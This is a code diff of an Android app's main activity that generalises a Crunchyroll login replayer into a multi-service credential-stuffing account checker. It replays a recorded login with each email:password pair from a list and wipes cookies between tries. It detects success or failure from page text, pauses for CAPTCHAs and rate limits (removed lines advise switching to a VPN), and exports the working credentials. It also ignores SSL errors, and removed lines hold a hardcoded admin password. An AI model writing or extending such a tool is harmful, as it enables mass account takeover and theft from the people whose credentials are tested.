@@ -18,6 +18,7 @@ import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Button;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import org.json.JSONArray;
@@ -25,8 +26,6 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -34,40 +33,47 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
-public class MainActivity extends Activity {
+public class MainActivity extends Activity implements ServiceSelectionManager.OnServiceSelectedListener {
 
     private static final String TAG = "WebAutomation";
     private WebView mWebView;
-    private final String mainUrl = "https://sso.crunchyroll.com/login";
-    private Button btnRecord, btnStop, btnPlay, btnStopBatch, btnSettings, btnResults, btnExportScript, btnInfo, btnAdSystem;
+    private TextView txtServiceName;
+    private Button btnRecord, btnStop, btnPlay, btnStopBatch, btnSettings, btnResults, btnInfo, btnAdSystem, btnChangeService;
 
-    private boolean isRecording = false;
+    // --- Recording State Machine ---
+    private static final int RECORD_MODE_NONE = 0;
+    private static final int RECORD_MODE_SUCCESS = 1;
+    private static final int RECORD_MODE_FAILURE = 2;
+    private int recordingMode = RECORD_MODE_NONE;
+
     private boolean isReplaying = false;
     private long recordingStartTime = 0;
     private long replayStartTime = 0;
     private int lastExecutedIndex = -1;
+
+    // Current Service
+    private ServiceRepository serviceRepo;
+    private ServiceRepository.ServiceData currentService;
 
     // Batch Execution State
     private List<String> credentialList = new ArrayList<>();
     private int currentCredentialIndex = 0;
     private boolean isBatchRunning = false;
     private int verificationAttempts = 0;
-    private static final int MAX_VERIFICATION_ATTEMPTS = 15; // ~30 seconds
+    private static final int MAX_VERIFICATION_ATTEMPTS = 20;
 
-    // We store events in a synchronized list to handle multi-threaded access from Bridge
     private List<JSONObject> currentSessionEvents = Collections.synchronizedList(new ArrayList<>());
 
-    // Auto Ad Check
-    private android.os.Handler adCheckHandler = new android.os.Handler();
-    private Runnable adCheckRunnable;
-
-    // Batch Logic Handlers
+    // Handlers
     private android.os.Handler batchHandler = new android.os.Handler();
     private Runnable verificationRunnable;
     private Runnable nextCredentialRunnable;
 
+    // Auto Ad
+    private android.os.Handler adCheckHandler = new android.os.Handler();
+    private Runnable adCheckRunnable;
+
     private static final String PREFS_NAME = "AutomationPrefs";
-    private static final String KEY_EVENTS = "saved_events";
     private static final String KEY_BATCH_INDEX = "batch_current_index";
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -77,76 +83,62 @@ public class MainActivity extends Activity {
         setContentView(R.layout.activity_main);
 
         mWebView = findViewById(R.id.activity_main_webview);
+        txtServiceName = findViewById(R.id.txt_service_name);
         btnRecord = findViewById(R.id.btn_record);
         btnStop = findViewById(R.id.btn_stop);
         btnPlay = findViewById(R.id.btn_play);
         btnStopBatch = findViewById(R.id.btn_stop_batch);
         btnSettings = findViewById(R.id.btn_settings);
         btnResults = findViewById(R.id.btn_results);
-        btnExportScript = findViewById(R.id.btn_export_script);
         btnInfo = findViewById(R.id.btn_info);
         btnAdSystem = findViewById(R.id.btn_ad_system);
+        btnChangeService = findViewById(R.id.btn_change_service);
 
+        serviceRepo = new ServiceRepository(this);
         setupWebView();
         setupButtons();
 
-        loadSavedEvents();
-        fetchRemoteScript();
-
-        if (isConnected()) {
-            mWebView.loadUrl(mainUrl);
-        } else {
-            showOfflineDialog();
-        }
-
+        loadLastService();
         startAdChecker();
     }
 
-    private void fetchRemoteScript() {
-        new Thread(() -> {
-            try {
-                java.net.URL url = new java.net.URL("https://www.preasx24.co.za/navigation.json");
-                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
-                conn.setConnectTimeout(10000);
-                conn.setReadTimeout(10000);
-                conn.setRequestMethod("GET");
-
-                if (conn.getResponseCode() == 200) {
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                    StringBuilder sb = new StringBuilder();
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        sb.append(line);
-                    }
-                    reader.close();
-
-                    String jsonResponse = sb.toString();
-                    // Validate JSON
-                    JSONArray jsonArray = new JSONArray(jsonResponse);
-
-                    // Save and Update
-                    runOnUiThread(() -> {
-                        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-                        prefs.edit().putString(KEY_EVENTS, jsonResponse).apply();
-
-                        // Update memory
-                        currentSessionEvents.clear();
-                        try {
-                            for (int i = 0; i < jsonArray.length(); i++) {
-                                currentSessionEvents.add(jsonArray.getJSONObject(i));
-                            }
-                            Log.i(TAG, "Remote script fetched and updated: " + currentSessionEvents.size() + " events");
-                        } catch (JSONException e) {
-                            Log.e(TAG, "Error updating memory from remote", e);
-                        }
-                    });
-                } else {
-                    Log.e(TAG, "Remote fetch failed: " + conn.getResponseCode());
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error fetching remote script", e);
+    private void loadLastService() {
+        String lastId = serviceRepo.getLastUsedServiceId();
+        if (lastId != null) {
+            ServiceRepository.ServiceData s = serviceRepo.getServiceById(lastId);
+            if (s != null) {
+                onServiceSelected(s);
+            } else {
+                showServiceSelection();
             }
-        }).start();
+        } else {
+            showServiceSelection();
+        }
+    }
+
+    private void showServiceSelection() {
+        new ServiceSelectionManager(this, this).showServiceSelectionDialog();
+    }
+
+    @Override
+    public void onServiceSelected(ServiceRepository.ServiceData service) {
+        this.currentService = service;
+        txtServiceName.setText("Service: " + service.getName());
+
+        // Load Script
+        try {
+            JSONArray arr = new JSONArray(service.getScriptJson());
+            currentSessionEvents.clear();
+            for(int i=0; i<arr.length(); i++) currentSessionEvents.add(arr.getJSONObject(i));
+        } catch (JSONException e) {
+            currentSessionEvents.clear();
+        }
+
+        if (isConnected()) {
+            mWebView.loadUrl(service.getLoginUrl());
+        } else {
+            showOfflineDialog();
+        }
     }
 
     private void setupWebView() {
@@ -164,34 +156,24 @@ public class MainActivity extends Activity {
             public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                 handler.proceed();
             }
-
             @Override
-            public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                return false;
-            }
-
+            public boolean shouldOverrideUrlLoading(WebView view, String url) { return false; }
             @Override
-            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
-                return false;
-            }
+            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { return false; }
 
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-                Log.d(TAG, "Page loaded: " + url);
 
-                if (isRecording) {
+                if (recordingMode != RECORD_MODE_NONE) {
                     injectRecorder();
                 } else if (isReplaying) {
-                     // Check if we are waiting for a clean start
                      if (isBatchRunning) {
-                         // Only inject if we are sure we are on the login page and ready
-                         if (url.startsWith(mainUrl)) {
-                             // Inject with a slight delay to ensure DOM is ready
-                             mWebView.postDelayed(() -> injectReplayer(), 1500);
-                         }
+                         // Only inject replayer if we are on or redirected from the login page
+                         // For now, we simply wait a bit and inject
+                         mWebView.postDelayed(() -> injectReplayer(), 1500);
                      } else {
-                         injectReplayer(); // Manual replay
+                         injectReplayer();
                      }
                 }
             }
@@ -199,117 +181,156 @@ public class MainActivity extends Activity {
     }
 
     private void setupButtons() {
-        // Default State: Hide Admin Controls
-        btnRecord.setVisibility(android.view.View.GONE);
+        // Admin controls are now public but only visible when relevant
         btnStop.setVisibility(android.view.View.GONE);
-        btnExportScript.setVisibility(android.view.View.GONE);
         btnStopBatch.setVisibility(android.view.View.GONE);
 
-        btnRecord.setOnClickListener(v -> startRecording());
+        btnRecord.setOnClickListener(v -> startRecordingPhase1());
         btnStop.setOnClickListener(v -> stopRecording());
         btnPlay.setOnClickListener(v -> startBatchReplay());
         btnStopBatch.setOnClickListener(v -> stopBatch());
         btnSettings.setOnClickListener(v -> startActivity(new android.content.Intent(this, SettingsActivity.class)));
-        btnSettings.setOnLongClickListener(v -> {
-            showAdminLoginDialog();
-            return true;
-        });
         btnResults.setOnClickListener(v -> showBatchResults());
-        btnExportScript.setOnClickListener(v -> exportCurrentScript());
+        btnChangeService.setOnClickListener(v -> showServiceSelection());
 
         btnInfo.setOnClickListener(v -> startActivity(new android.content.Intent(this, InfoActivity.class)));
         btnAdSystem.setOnClickListener(v -> startActivity(new android.content.Intent(this, AdSystemActivity.class)));
     }
 
-    private void showAdminLoginDialog() {
-        android.view.View dialogView = android.view.LayoutInflater.from(this).inflate(R.layout.dialog_admin_login, null);
-        android.widget.EditText etUser = dialogView.findViewById(R.id.et_username);
-        android.widget.EditText etPass = dialogView.findViewById(R.id.et_password);
+    // --- Recording Logic ---
+
+    private void startRecordingPhase1() {
+        if (currentService == null) {
+            Toast.makeText(this, "Select a service first", Toast.LENGTH_SHORT).show();
+            return;
+        }
 
         new AlertDialog.Builder(this)
-            .setTitle("Admin Login")
-            .setView(dialogView)
-            .setPositiveButton("Login", (dialog, which) -> {
-                String user = etUser.getText().toString();
-                String pass = etPass.getText().toString();
-                if ("admin".equals(user) && "preasx24".equals(pass)) {
-                    enableAdminMode();
-                } else {
-                    Toast.makeText(this, "Invalid Credentials", Toast.LENGTH_SHORT).show();
-                }
+            .setTitle("Step 1: Success Recording")
+            .setMessage("Please log in with VALID credentials.\n\nClick STOP when you reach the dashboard/success page.")
+            .setPositiveButton("Start", (d, w) -> {
+                // Reset session
+                currentSessionEvents.clear();
+                recordingStartTime = System.currentTimeMillis();
+                recordingMode = RECORD_MODE_SUCCESS;
+
+                // Reset UI
+                btnRecord.setVisibility(android.view.View.GONE);
+                btnStop.setVisibility(android.view.View.VISIBLE);
+                btnPlay.setVisibility(android.view.View.GONE);
+
+                mWebView.loadUrl(currentService.getLoginUrl());
             })
             .setNegativeButton("Cancel", null)
             .show();
     }
 
-    private void enableAdminMode() {
-        btnRecord.setVisibility(android.view.View.VISIBLE);
-        btnStop.setVisibility(android.view.View.VISIBLE);
-        btnExportScript.setVisibility(android.view.View.VISIBLE);
-        Toast.makeText(this, "Admin Mode Enabled", Toast.LENGTH_SHORT).show();
-    }
+    private void startRecordingPhase2() {
+        new AlertDialog.Builder(this)
+            .setTitle("Step 2: Failure Recording")
+            .setMessage("Now, log in with INVALID credentials.\n\nClick STOP when you see the error message.")
+            .setPositiveButton("Start", (d, w) -> {
+                recordingStartTime = System.currentTimeMillis(); // Reset timer? Or keep? Doesn't matter for failure check.
+                recordingMode = RECORD_MODE_FAILURE;
 
-    private void exportCurrentScript() {
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        String jsonString = prefs.getString(KEY_EVENTS, "[]");
+                btnRecord.setVisibility(android.view.View.GONE);
+                btnStop.setVisibility(android.view.View.VISIBLE);
+                btnPlay.setVisibility(android.view.View.GONE);
 
-        android.content.Intent sendIntent = new android.content.Intent();
-        sendIntent.setAction(android.content.Intent.ACTION_SEND);
-        sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, jsonString);
-        sendIntent.setType("text/plain");
-
-        android.content.Intent shareIntent = android.content.Intent.createChooser(sendIntent, "Export Navigation JSON");
-        startActivity(shareIntent);
-    }
-
-    private void startRecording() {
-        isRecording = true;
-        isReplaying = false;
-        recordingStartTime = System.currentTimeMillis();
-        currentSessionEvents.clear(); // Start fresh
-
-        Toast.makeText(this, "Recording Started", Toast.LENGTH_SHORT).show();
-        injectRecorder();
+                // Clear state and reload
+                 android.webkit.CookieManager.getInstance().removeAllCookies(null);
+                 android.webkit.WebStorage.getInstance().deleteAllData();
+                 mWebView.clearCache(true);
+                 mWebView.loadUrl(currentService.getLoginUrl());
+            })
+            .setCancelable(false)
+            .show();
     }
 
     private void stopRecording() {
-        if (!isRecording) return;
-        isRecording = false;
-        saveSessionToPrefs();
-        Toast.makeText(this, "Stopped & Saved " + currentSessionEvents.size() + " events", Toast.LENGTH_SHORT).show();
+        if (recordingMode == RECORD_MODE_NONE) return;
+
+        if (recordingMode == RECORD_MODE_SUCCESS) {
+            // Save Success State
+            String currentUrl = mWebView.getUrl();
+            currentService.setSuccessUrl(currentUrl);
+
+            JSONArray arr = new JSONArray(currentSessionEvents);
+            currentService.setScriptJson(arr.toString());
+
+            Toast.makeText(this, "Success Script Saved!", Toast.LENGTH_SHORT).show();
+
+            recordingMode = RECORD_MODE_NONE;
+            btnStop.setVisibility(android.view.View.GONE);
+
+            // Trigger Phase 2
+            startRecordingPhase2();
+
+        } else if (recordingMode == RECORD_MODE_FAILURE) {
+            // Analyze Failure State
+            mWebView.evaluateJavascript(
+                "(function(){ return document.body.innerText.toLowerCase(); })();",
+                value -> {
+                    List<String> keywords = new ArrayList<>();
+                    if (value != null) {
+                        // Simple heuristic: check for common words found in the text
+                        String text = value.toLowerCase();
+                        if (text.contains("invalid")) keywords.add("invalid");
+                        if (text.contains("incorrect")) keywords.add("incorrect");
+                        if (text.contains("error")) keywords.add("error");
+                        if (text.contains("failed")) keywords.add("failed");
+                        if (text.contains("check your")) keywords.add("check your");
+                        if (text.contains("try again")) keywords.add("try again");
+                    }
+
+                    if (keywords.isEmpty()) {
+                        keywords.add("incorrect"); // Default fallback
+                        keywords.add("invalid");
+                    }
+
+                    currentService.setFailureKeywords(keywords);
+                    serviceRepo.addOrUpdateService(currentService);
+
+                    Toast.makeText(this, "Service Setup Complete!", Toast.LENGTH_LONG).show();
+
+                    recordingMode = RECORD_MODE_NONE;
+                    btnRecord.setVisibility(android.view.View.VISIBLE);
+                    btnStop.setVisibility(android.view.View.GONE);
+                    btnPlay.setVisibility(android.view.View.VISIBLE);
+
+                    // Reload clean
+                    mWebView.loadUrl(currentService.getLoginUrl());
+                });
+        }
     }
 
+    // --- Batch Replay Logic ---
+
     private void startBatchReplay() {
-        if (currentSessionEvents.isEmpty()) {
-            Toast.makeText(this, "No saved session to replay. Record one first.", Toast.LENGTH_SHORT).show();
+        if (currentService == null || currentSessionEvents.isEmpty()) {
+            Toast.makeText(this, "Service not configured. Record first.", Toast.LENGTH_SHORT).show();
             return;
         }
 
-        // Load credentials
-        SharedPreferences prefs = getSharedPreferences(SettingsActivity.PREFS_NAME, MODE_PRIVATE);
-        String creds = prefs.getString(SettingsActivity.KEY_CREDENTIALS, "");
-        if (creds.isEmpty()) {
-            Toast.makeText(this, "No credentials found. Check Settings.", Toast.LENGTH_SHORT).show();
-            return;
-        }
+        // Load credentials for THIS service
+        SharedPreferences settings = getSharedPreferences(SettingsActivity.PREFS_NAME, MODE_PRIVATE);
+        String creds = settings.getString("creds_" + currentService.getId(), "");
 
         credentialList.clear();
         String[] lines = creds.split("\n");
         for (String line : lines) {
-            if (line.contains(":")) {
-                credentialList.add(line.trim());
-            }
+            if (line.contains(":")) credentialList.add(line.trim());
         }
 
         if (credentialList.isEmpty()) {
-            Toast.makeText(this, "No valid credentials parsed.", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "No credentials found in Settings for this service.", Toast.LENGTH_SHORT).show();
             return;
         }
 
-        isRecording = false;
         isReplaying = true;
         isBatchRunning = true;
 
+        // Check for resume
         SharedPreferences autoPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         int savedIndex = autoPrefs.getInt(KEY_BATCH_INDEX, 0);
 
@@ -336,8 +357,9 @@ public class MainActivity extends Activity {
     private void startBatchExecution() {
         btnPlay.setVisibility(android.view.View.GONE);
         btnStopBatch.setVisibility(android.view.View.VISIBLE);
+        btnRecord.setVisibility(android.view.View.GONE);
 
-        Toast.makeText(this, "Starting Batch Replay: " + credentialList.size() + " accounts", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "Starting Batch: " + currentService.getName(), Toast.LENGTH_SHORT).show();
         processNextCredential();
     }
 
@@ -345,28 +367,25 @@ public class MainActivity extends Activity {
         isBatchRunning = false;
         isReplaying = false;
 
-        // Remove all pending callbacks
         if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
         if (nextCredentialRunnable != null) batchHandler.removeCallbacks(nextCredentialRunnable);
 
         btnPlay.setVisibility(android.view.View.VISIBLE);
+        btnRecord.setVisibility(android.view.View.VISIBLE);
         btnStopBatch.setVisibility(android.view.View.GONE);
 
-        Toast.makeText(this, "Batch Execution Stopped", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "Batch Stopped", Toast.LENGTH_SHORT).show();
     }
 
     private void processNextCredential() {
         if (!isBatchRunning) return;
 
-        // Explicitly clear any pending handlers to prevent overlaps
         if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
         if (nextCredentialRunnable != null) batchHandler.removeCallbacks(nextCredentialRunnable);
 
         if (currentCredentialIndex >= credentialList.size()) {
-            // Reset progress on completion
             getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(KEY_BATCH_INDEX, 0).apply();
-
-            stopBatch(); // Reset UI state
+            stopBatch();
             runOnUiThread(() -> new AlertDialog.Builder(MainActivity.this)
                 .setTitle("Batch Complete")
                 .setMessage("Processed all accounts.")
@@ -375,51 +394,36 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // Save progress
         getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(KEY_BATCH_INDEX, currentCredentialIndex).apply();
-
         String currentPair = credentialList.get(currentCredentialIndex);
         Log.d(TAG, "Processing: " + currentPair);
 
         final int targetIndex = currentCredentialIndex;
 
-        // Robust Cookie Clearing
         android.webkit.CookieManager.getInstance().removeAllCookies(value -> {
-            Log.d(TAG, "Cookies removed: " + value);
-            // After cookies are removed, clear storage and cache
             android.webkit.WebStorage.getInstance().deleteAllData();
             mWebView.clearCache(true);
 
-            // Wait a bit to ensure cleanup is propagated and then load URL
             batchHandler.postDelayed(() -> {
                  if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
                  replayStartTime = System.currentTimeMillis();
                  lastExecutedIndex = -1;
-
-                 // Ensure we are on the correct URL before injecting anything
-                 // Force reload to ensure clean state even if URL matches
-                 mWebView.loadUrl(mainUrl);
+                 mWebView.loadUrl(currentService.getLoginUrl());
             }, 1000);
         });
     }
 
     private void injectRecorder() {
-        Log.d(TAG, "Injecting Recorder Script");
         String js = readAssetFile("recorder.js");
-        // Inject start time variable first
         String setup = "window.recordingStartTime = " + recordingStartTime + ";";
         mWebView.evaluateJavascript(setup + js, null);
     }
 
     private void injectReplayer() {
         if (!isReplaying) return;
-
-        Log.d(TAG, "Injecting Replayer Script");
         String js = readAssetFile("replayer.js");
-
         verificationAttempts = 0;
 
-        // Get current credentials
         String email = "";
         String pass = "";
         if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
@@ -428,21 +432,14 @@ public class MainActivity extends Activity {
             if (parts.length > 1) pass = parts[1].trim();
         }
 
-        // Convert list to JSON string
         JSONArray jsonArray = new JSONArray(currentSessionEvents);
-        String eventsJson = jsonArray.toString();
-
-        // Use JSON object for overrides to avoid escaping issues
         JSONObject overrides = new JSONObject();
         try {
             overrides.put("email", email);
             overrides.put("password", pass);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating override JSON", e);
-        }
+        } catch (JSONException e) {}
 
-        // Inject events, start time, and progress
-        String setup = "window.replayEvents = " + eventsJson + "; " +
+        String setup = "window.replayEvents = " + jsonArray.toString() + "; " +
                        "window.replayStartTime = " + replayStartTime + "; " +
                        "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
                        "var overrides = " + overrides.toString() + "; " +
@@ -451,59 +448,44 @@ public class MainActivity extends Activity {
 
         mWebView.evaluateJavascript(setup + js, null);
 
-        // Start checking for results after the estimated replay duration
-        long replayDuration = 0;
-        String targetSuccessUrl = "";
-        if (!currentSessionEvents.isEmpty()) {
-            try {
-                JSONObject last = currentSessionEvents.get(currentSessionEvents.size() - 1);
-                replayDuration = last.getLong("time");
-                if (last.has("url")) {
-                    targetSuccessUrl = last.getString("url");
-                }
-            } catch (JSONException e) {}
-        }
-
-        final String finalTargetUrl = targetSuccessUrl;
         final int targetIndex = currentCredentialIndex;
-
-        // Define the verification runnable
-        verificationRunnable = () -> checkVerificationStatus(finalTargetUrl, targetIndex);
-        // Start verification almost immediately (1s delay) to catch early success/failure
-        // We will keep checking periodically until MAX_VERIFICATION_ATTEMPTS or success
-        batchHandler.postDelayed(verificationRunnable, 1000);
+        // Start verification
+        verificationRunnable = () -> checkVerificationStatus(targetIndex);
+        batchHandler.postDelayed(verificationRunnable, 2000);
     }
 
-    private void checkVerificationStatus(String targetUrl, int targetIndex) {
+    private void checkVerificationStatus(int targetIndex) {
         if (!isBatchRunning) return;
-        // Strictly check if we are still on the same account
-        if (targetIndex != currentCredentialIndex) {
-            Log.w(TAG, "Verification aborted: Index mismatch (Target: " + targetIndex + ", Current: " + currentCredentialIndex + ")");
-            return;
-        }
+        if (targetIndex != currentCredentialIndex) return;
 
         if (verificationAttempts >= MAX_VERIFICATION_ATTEMPTS) {
-            logResult(false, "Timeout waiting for result", targetIndex);
+            logResult(false, "Timeout", targetIndex);
             moveToNext(targetIndex);
             return;
         }
         verificationAttempts++;
 
         String js = readAssetFile("verifier.js");
-        // Inject the target URL variable before running verifier
-        String injection = "window.targetSuccessUrl = '" + targetUrl + "'; ";
+
+        // Inject Dynamic Configs from ServiceData
+        String successUrl = currentService.getSuccessUrl() != null ? currentService.getSuccessUrl() : "";
+        List<String> keywords = currentService.getFailureKeywords();
+        JSONArray kwJson = new JSONArray();
+        if (keywords != null) {
+            for(String k : keywords) kwJson.put(k);
+        }
+
+        String injection = "window.targetSuccessUrl = '" + successUrl + "'; " +
+                           "window.failureKeywords = " + kwJson.toString() + ";";
 
         mWebView.evaluateJavascript(injection + js, value -> {
-            if (!isBatchRunning) return; // Stop if batch was stopped during eval
-            if (targetIndex != currentCredentialIndex) return; // Double check
+            if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
 
             if (value != null && value.length() > 2) {
                  String jsonStr = value;
                  if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
-                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1);
-                     jsonStr = jsonStr.replace("\\\"", "\"");
+                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1).replace("\\\"", "\"");
                  }
-
                  try {
                      JSONObject res = new JSONObject(jsonStr);
                      String status = res.getString("status");
@@ -517,86 +499,64 @@ public class MainActivity extends Activity {
                      } else if ("rate_limit".equals(status)) {
                          handleRateLimit();
                      } else if ("challenge".equals(status)) {
-                         handleChallenge(targetIndex, targetUrl);
+                         handleChallenge(targetIndex);
                      } else {
-                         // Still pending
-                         Log.d(TAG, "Verification pending: " + res.optString("detail"));
-                         verificationRunnable = () -> checkVerificationStatus(targetUrl, targetIndex);
+                         verificationRunnable = () -> checkVerificationStatus(targetIndex);
                          batchHandler.postDelayed(verificationRunnable, 2000);
                      }
                  } catch (JSONException e) {
-                     Log.e(TAG, "Error parsing verification result: " + value, e);
-                     verificationRunnable = () -> checkVerificationStatus(targetUrl, targetIndex);
+                     verificationRunnable = () -> checkVerificationStatus(targetIndex);
                      batchHandler.postDelayed(verificationRunnable, 2000);
                  }
             } else {
-                verificationRunnable = () -> checkVerificationStatus(targetUrl, targetIndex);
+                verificationRunnable = () -> checkVerificationStatus(targetIndex);
                 batchHandler.postDelayed(verificationRunnable, 2000);
             }
         });
     }
 
-    private void handleChallenge(int targetIndex, String targetUrl) {
-        if (targetIndex != currentCredentialIndex) return;
+    // --- Common Utilities ---
 
-        Log.w(TAG, "Challenge Detected! Pausing...");
+    private void handleChallenge(int targetIndex) {
+        if (targetIndex != currentCredentialIndex) return;
         if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
 
         runOnUiThread(() -> {
-            AlertDialog dialog = new AlertDialog.Builder(this)
+            new AlertDialog.Builder(this)
                 .setTitle("Challenge Detected")
-                .setMessage("Please solve the CAPTCHA or Challenge manually.\nThe script is paused.")
+                .setMessage("Please solve the CAPTCHA or Challenge manually.")
                 .setCancelable(false)
                 .setPositiveButton("I Solved It", (d, w) -> {
-                     // Resume verification checks immediately
-                     Toast.makeText(this, "Resuming...", Toast.LENGTH_SHORT).show();
                      verificationAttempts = 0;
-                     checkVerificationStatus(targetUrl, targetIndex);
+                     checkVerificationStatus(targetIndex);
                 })
-                .create();
-            dialog.show();
+                .show();
         });
     }
 
     private void handleRateLimit() {
-        Log.w(TAG, "Rate Limit Detected! Pausing...");
-
-        // Remove pending verifications
         if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
-
-        // Show Dialog
         runOnUiThread(() -> {
             AlertDialog dialog = new AlertDialog.Builder(this)
-                .setTitle("Rate Limit Detected")
-                .setMessage("Waiting 5 minutes...\nPlease connect to a VPN/Proxy.")
+                .setTitle("Rate Limit")
+                .setMessage("Waiting 5 minutes...")
                 .setCancelable(false)
-                .setPositiveButton("I Connected VPN - Continue", (d, w) -> {
-                    // User manually continued
+                .setPositiveButton("Continue", (d, w) -> {
                      d.dismiss();
-                     // Retry the SAME credential
-                     Toast.makeText(this, "Resuming...", Toast.LENGTH_SHORT).show();
                      processNextCredential();
                 })
                 .create();
             dialog.show();
 
-            // 5 Minute Countdown
             new CountDownTimer(300000, 1000) {
                 public void onTick(long millisUntilFinished) {
-                    if (dialog.isShowing()) {
-                        dialog.setMessage("Waiting " + (millisUntilFinished / 1000) + "s...\nPlease connect to a VPN/Proxy.");
-                    } else {
-                        cancel();
-                    }
+                    if (dialog.isShowing()) dialog.setMessage("Waiting " + (millisUntilFinished / 1000) + "s...");
+                    else cancel();
                 }
-
                 public void onFinish() {
                     if (dialog.isShowing()) {
                         dialog.dismiss();
-                        if (isBatchRunning) {
-                            Toast.makeText(MainActivity.this, "Time's up. Retrying...", Toast.LENGTH_SHORT).show();
-                            processNextCredential();
-                        }
+                        if (isBatchRunning) processNextCredential();
                     }
                 }
             }.start();
@@ -605,15 +565,13 @@ public class MainActivity extends Activity {
 
     private void logResult(boolean success, String detail, int index) {
         if (index >= credentialList.size()) return;
-
         String cred = credentialList.get(index);
         String status = success ? "SUCCESS" : "FAILURE";
         String msg = status + " " + cred + " (powered by DTECH)";
-        Log.i(TAG, "Batch Result (" + index + "): " + msg);
+        Log.i(TAG, "Batch Result: " + msg);
         runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
         saveResultToFile(msg);
 
-        // Stop checking this account immediately
         if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
     }
 
@@ -622,150 +580,82 @@ public class MainActivity extends Activity {
             java.io.FileOutputStream fos = openFileOutput("batch_results.txt", MODE_APPEND);
             fos.write((resultLine + "\n").getBytes());
             fos.close();
-        } catch (IOException e) {
-            Log.e(TAG, "Failed to save result", e);
-        }
+        } catch (IOException e) { Log.e(TAG, "Save failed", e); }
     }
 
     private void showBatchResults() {
         try {
-            java.io.FileInputStream fis = openFileInput("batch_results.txt");
+            FileInputStream fis = openFileInput("batch_results.txt");
             BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
             StringBuilder sb = new StringBuilder();
             String line;
-            while ((line = reader.readLine()) != null) {
-                sb.append(line).append("\n");
-            }
+            while ((line = reader.readLine()) != null) sb.append(line).append("\n");
             reader.close();
 
-            String results = sb.toString();
+            String res = sb.toString();
             new AlertDialog.Builder(this)
                 .setTitle("Batch Results")
-                .setMessage(results.length() > 0 ? results : "No results yet.")
+                .setMessage(res.length() > 0 ? res : "No results.")
                 .setPositiveButton("OK", null)
-                .setNegativeButton("Share", (d, w) -> shareResults(results))
-                .setNeutralButton("Options", (d, w) -> showResultOptions(results))
+                .setNegativeButton("Share", (d, w) -> shareResults(res))
+                .setNeutralButton("Options", (d, w) -> showResultOptions(res))
                 .show();
-
-        } catch (IOException e) {
-            Toast.makeText(this, "No results found.", Toast.LENGTH_SHORT).show();
-        }
+        } catch (IOException e) { Toast.makeText(this, "No results.", Toast.LENGTH_SHORT).show(); }
     }
 
     private void showResultOptions(String results) {
         String[] options = {"Copy Success Only", "Clear Results"};
-        new AlertDialog.Builder(this)
-            .setTitle("Options")
-            .setItems(options, (dialog, which) -> {
-                if (which == 0) {
-                    copySuccessResults(results);
-                } else if (which == 1) {
-                    deleteFile("batch_results.txt");
-                    Toast.makeText(this, "Results Cleared", Toast.LENGTH_SHORT).show();
-                }
-            })
-            .show();
+        new AlertDialog.Builder(this).setItems(options, (d, w) -> {
+            if (w == 0) copySuccessResults(results);
+            else if (w == 1) { deleteFile("batch_results.txt"); Toast.makeText(this, "Cleared", Toast.LENGTH_SHORT).show(); }
+        }).show();
     }
 
-    private void copySuccessResults(String fullResults) {
-        StringBuilder successOnly = new StringBuilder();
-        String[] lines = fullResults.split("\n");
-        for (String line : lines) {
-            if (line.contains("SUCCESS")) {
-                successOnly.append(line).append("\n");
-            }
+    private void copySuccessResults(String full) {
+        StringBuilder sb = new StringBuilder();
+        for (String line : full.split("\n")) {
+            if (line.contains("SUCCESS")) sb.append(line).append("\n");
         }
-
-        if (successOnly.length() == 0) {
-             Toast.makeText(this, "No successful results to copy", Toast.LENGTH_SHORT).show();
-             return;
-        }
-
-        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        android.content.ClipData clip = android.content.ClipData.newPlainText("Success Results", successOnly.toString());
-        clipboard.setPrimaryClip(clip);
-        Toast.makeText(this, "Success results copied to clipboard", Toast.LENGTH_SHORT).show();
+        if (sb.length() == 0) { Toast.makeText(this, "None", Toast.LENGTH_SHORT).show(); return; }
+        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        cm.setPrimaryClip(android.content.ClipData.newPlainText("Results", sb.toString()));
+        Toast.makeText(this, "Copied", Toast.LENGTH_SHORT).show();
     }
 
